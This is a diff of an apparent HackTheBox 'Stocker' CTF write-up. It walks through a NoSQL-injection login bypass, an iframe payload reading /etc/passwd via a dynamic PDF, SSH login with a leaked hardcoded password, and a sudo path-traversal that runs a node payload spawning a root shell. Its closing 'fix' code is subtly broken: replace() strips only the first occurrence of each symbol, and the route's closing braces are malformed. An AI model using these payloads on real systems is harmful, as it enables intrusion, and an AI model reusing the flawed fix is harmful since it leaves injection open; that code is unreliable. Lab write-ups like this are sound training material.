@@ -10,7 +10,7 @@ tags: ['Difficulty: 🟢 Easy', 'OS: Linux', 'CTF: HackTheBox']
   alt="Stocker HTB Overview Image"
   description="Stocker starts with a static site 
   powered by Eleventy. After digging a bit, I found there's a 
-  subdomain with a login page that is running Express.js and is vulnerable to NoSQL Injection. 
+  subdomain with a login page that is running Express.js and it's vulnerable to NoSQL Injection. 
   We bypass the aunthentication and log in to the site. 
   I'll exploit an unsanitized input that's being passed to a dynamic PDF that leads to a 
   file disclosure and use that to get source code of the application and find a hardcoded password and get a shell on the box.
@@ -65,7 +65,7 @@ We see that it tries to redirect us to `http://stocker.htb` but it's not resolvi
 
 All links on the site doesn't redirect except a few ones that points to another sections of the site. At the end, there's a staff section with **Angoose Garden** as the Head of IT at Stockers Ltd. We'll keep that in mind as a possible username.
 
-Given the `stocker.htb` domain, I'll look for possibles subdomains with `gobuster`
+Given the `stocker.htb` domain, I'll look for possibles subdomains with `gobuster`.
 
 #### Subdomain fuzzing
 
@@ -92,7 +92,7 @@ Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
 ===============================================================
 ```
 
-We add `dev.stocker.htb` to our `/etc/hosts` file
+We add `dev.stocker.htb` to our `/etc/hosts` file.
 
 ### DEV
 
@@ -100,7 +100,7 @@ In the dev site, we see a login page. A few guesses like `admin:admin` or `admin
 
 ![Stocker Dev](/images/htb-stocker-writeup/dev-stocker-login.png)
 
-We can see the headers of the site either with [Wappalyzer](https://addons.mozilla.org/es/firefox/addon/wappalyzer/) or with the curl command. We also see it's using nginx.
+We can see the headers of the site either with [Wappalyzer](https://addons.mozilla.org/es/firefox/addon/wappalyzer/) or with the curl command. We see it's using nginx.
 
 ```shell
 curl -s http://dev.stocker.htb/ -L -I
@@ -115,7 +115,158 @@ X-Powered-By: Express
 [SNIP...]
 ```
 
-Express is a web application framework for Node.js. It's often used to build web applications and APIs, storing data in MongoDB databases. This is known as the [MEAN](https://www.mongodb.com/mean-stack#:~:text=The%20MEAN%20stack%20is%20a,a%20client%2Dside%20JavaScript%20framework) stack.
+In the `X-Powered-By` we see this application is running Express. Express is a web application framework for Node.js. It's often used to build web applications and APIs, storing data in MongoDB databases. This is known as the [MEAN](https://www.mongodb.com/mean-stack#:~:text=The%20MEAN%20stack%20is%20a,a%20client%2Dside%20JavaScript%20framework) stack.
 As the MongoDB team says:
 
 > “The MEAN stack is a JavaScript-based framework for developing web applications. MEAN is named after MongoDB, Express, Angular, and Node, the four key technologies that make up the layers of the stack."
+
+With that in mind, we can try to find a possible NoSQL Injection vulnerability. HackTricks have a good page for more information regarding to this [topic](https://book.hacktricks.xyz/pentesting-web/nosql-injection). Basically, we are going to try to bypass the authentication by injecting a query that will return true.
+We intercept the request with Burp Suite and see how the request is being sent.
+
+We see that the `username` and `password` are being sent as www-form-urlencoded.
+
+![Stocker Burpsuite Login Request](/images/htb-stocker-writeup/stocker-burpsuite-request.png)
+
+We try the www-form-urlencoded payload `username[$ne]=admin&password[$ne]=password` replacing it in the request but we got **Invalid username or password**. Another thing we could try is change the `Content-Type` to `application/json` and send the payload as JSON.
+
+![Burpsuite modified request](/images/htb-stocker-writeup/stocker-modified-request.png)
+
+And we are in!
+
+![Dev Stocker Dashboard](/images/htb-stocker-writeup/dev-dashboard-page.png)
+
+## Shell as angoose
+
+### Dynamic PDF
+
+The page is all about shopping products, we can add products to the cart and checkout. We can inspect the source code of the application by opening the developer tools in the browser and take a look at the _Debugger_ tab. There are some routes exposed in the application. We can note them down for later.
+
+![Stocker Debugger](/images/htb-stocker-writeup/stocker-debugger-code.png)
+
+The routes are:
+
+- `/api/products`
+- `/api/order` -> `POST`
+- `/api/po/:id`
+
+There's not much else to look at. We proceed to add some products, go to the cart and see there's a **Submit Purchase** button. We click it and we get a message saying that the purchase was successful and we got a link to see the invoice.
+
+![Stocker Basket](/images/htb-stocker-writeup/stocker-view-cart.png)
+
+![Stocker Invoice](/images/htb-stocker-writeup/stocker-invoice-pdf.png)
+
+### XSS in the title field
+
+Intercepting the request with Burp Suite, we see the `title` we are sending, is the one that's being displayed in the PDF. I'm going to change the title and see what happens.
+
+![Modify Title Request](/images/htb-stocker-writeup/modify-submit-purchase.png)
+
+![Invoice with modified title](/images/htb-stocker-writeup/stocker-invoice-change.png)
+
+With this in mind, we can try and inject a DOM element (in this case we are going to use an `iframe`) and see if it's getting displayed in the PDF. I'll extract the payload from [Exploit Notes](https://exploit-notes.hdks.org/exploit/web/security-risk/xss-with-dynamic-pdf/) and put that in the title.
+I'm first going to grab a file that surely exists: `<iframe src=file:///etc/passwd width=1000px height=1000px></iframe>`
+
+![Stocker File Disclosure](/images/htb-stocker-writeup/stocker-file-disclosure.png)
+
+Awesome! We now have a file disclosure. We can use this to further enumerate the application and see what's running in the server. We also see there's the `angoose` user.
+
+### Source code disclosure
+
+We previously saw the application is being served with nginx. Although users can change the location where the files are being served, the default location is `/var/www/html`. Knowing this, we can try `/var/www/dev/index.js`. We use `dev` because that's the subdomain we are in and `index.js` because usually the main file or entry point for _node.js_ applications is called `index.js` or `app.js`.
+
+![Stocker Source Code](/images/htb-stocker-writeup/source-code-app.png)
+
+We get the source code. In the first few lines, there's a string connection with hardcoded credentials. We can try to see if there's some password reutilization and try to log in with `SSH` and grab the user flag.
+
+```shell
+sshpass -p 'IHeardPassphrasesArePrettySecure' ssh angoose@stocker.htb
+[...SNIP]
+[...SNIP]
+
+angoose@stocker:~$ cat user.txt
+457b8e7*************************
+```
+
+## Shell as root
+
+### Enumeration
+
+As we have the password for the `angoose` user, we can try to see if we can run any command with `sudo`. We can use `sudo -l` to see what commands we can run as root.
+
+```shell
+angoose@stocker:~$ sudo -l
+[sudo] password for angoose:
+Matching Defaults entries for angoose on stocker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User angoose may run the following commands on stocker:
+    (ALL) /usr/bin/node /usr/local/scripts/*.js
+```
+
+We see we can run any script with `node` inside `/usr/local/scripts/`. We can try and take a look at these scripts but we don't have permissions to read/write them as _others_ only have the executable permission set.
+
+```shell
+angoose@stocker:~$ ls -la /usr/local/scripts/
+total 32
+drwxr-xr-x  3 root root 4096 Dec  6  2022 .
+drwxr-xr-x 11 root root 4096 Dec  6  2022 ..
+-rwxr-x--x  1 root root  245 Dec  6  2022 creds.js
+-rwxr-x--x  1 root root 1625 Dec  6  2022 findAllOrders.js
+-rwxr-x--x  1 root root  793 Dec  6  2022 findUnshippedOrders.js
+drwxr-xr-x  2 root root 4096 Dec  6  2022 node_modules
+-rwxr-x--x  1 root root 1337 Dec  6  2022 profitThisMonth.js
+-rwxr-x--x  1 root root  623 Dec  6  2022 schema.js
+```
+
+### Node with sudo
+
+Initially on this box, I ran `linpeas.sh`. I didn't find lots of interesting things there. After trying different scenarios,
+I asked for a hint in the official [HTB discord server](https://discord.gg/hackthebox). I was told to take a look at the wildcard (`*`) in the path.
+It turns out that the way the shell interprets the wildcard, it's normalizing the path and only verifying if the file we want to execute is indeed a `js` file.
+So we can go 3 directories up and look for a directory we have permissions to write to.
+Then we can create a file called `pwn.js` and run one of the payloads from [GTFOBins](https://gtfobins.github.io/gtfobins/node/)
+
+```shell
+angoose@stocker:~$ cd /tmp
+angoose@stocker:/tmp$ echo -n 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})' > pwn.js
+angoose@stocker:/tmp$ sudo /usr/bin/node /usr/local/scripts/../../../tmp/pwn.js
+[sudo] password for angoose:
+root@stocker:/tmp#
+```
+
+And we can grab the root flag.
+
+```shell
+root@stocker:~ cat root.txt
+1ee4cd8b************************
+```
+
+## Fixing the vulnerability (shell as angoose)
+
+After looking at the final code, I was curious on how to fix the vulnerability in the Dynamic PDF. For the sake of not making this post too long, I'll just leave the code here and explain what I did.
+
+To the `/api/order` endpoint, I created an array of bad characters that are going to be cleaned from the title input. Then, I loop through the array and replace the bad characters with an empty string. This way, we can sanitize the input and avoid any malicious code to be injected.
+
+```javascript
+app.post("/api/order", async (req, res) => {
+ if (!req.session.user) return res.json({});
+
+ if (!req.body.basket) return res.json({ success: false });
+
+ const badSymbols = ["<", ">", "&", "$", "#", "!", "@", "%", "^", "*", "(", ")", "+", "=", "~", "`", "{", "}", "[", "]", "|", "\\", "/", "?", ",", ".", ":", ";"];
+
+ // Sanitizing title input in basket array
+ req.body.basket.forEach((item) => {
+   badSymbols.forEach((symbol) => {
+     item.title = item.title.replace(symbol, "");
+   });
+ });
+
+ const order = new mongoose.model("Order")({
+   items: req.body.basket.map((item) => ({ title: item.title, price: item.price, amount: item.amount })),
+ });
+ await order.save();
+
+ return res.json({ success: true, orderId: order._id });
+ );
+```
